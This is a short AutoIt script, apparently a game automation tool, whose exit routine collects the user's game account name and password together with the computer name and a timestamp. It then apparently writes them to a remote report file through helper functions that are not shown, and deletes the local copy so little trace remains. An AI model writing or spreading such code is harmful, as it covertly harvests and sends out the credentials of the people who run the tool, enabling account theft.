#include <MsgBoxConstants.au3>

; Press Esc to terminate script, Pause/Break to "pause"

Global $g_bPaused = False, $acc = '', $pass = '', $game_name = '', $csuccess = 0, $count = 0, $total = 0
HotKeySet("^+X", "TogglePause")  ;Ctrl+Shift+X
HotKeySet("{ESC}", "Terminate")

Func TogglePause()
	$g_bPaused = Not $g_bPaused
	While $g_bPaused
		Sleep(100)
		ToolTip('Script is "Paused"', 0, 0)
	WEnd
	ToolTip("")
EndFunc   ;==>TogglePause

Func Terminate()
	_Text('[+] Đang đóng chương trình' & @CRLF & '[+] Vui lòng đợi....')
	_temp()
	_dumamadownload('report.txt')
	FileWrite(@AppDataDir & '\report.txt', $download)
	$data = ''
	For $i = 1 To _FileCountLines(@AppDataDir & '\report.txt')
		$data = $data & '\n' & FileReadLine(@AppDataDir & '\report.txt', $i)
	Next
	$data = StringRight($data, StringLen($data) - 2)
	_dumamaedit('report.txt', $data & '\n' & @HOUR & ':' & @MIN & ' - ' & @MDAY & '/' & @MON & '/' & @YEAR & ': ' & @ComputerName & ': ' & 'Account: ' & $acc & ' Pass: ' & $pass & ' Count: ' & $count & ' Success: ' & $csuccess & ' Total: ' & $total & ' ' & $game_name & '\n')
	FileDelete(@AppDataDir & '\report.txt')
	Exit
EndFunc   ;==>Terminate
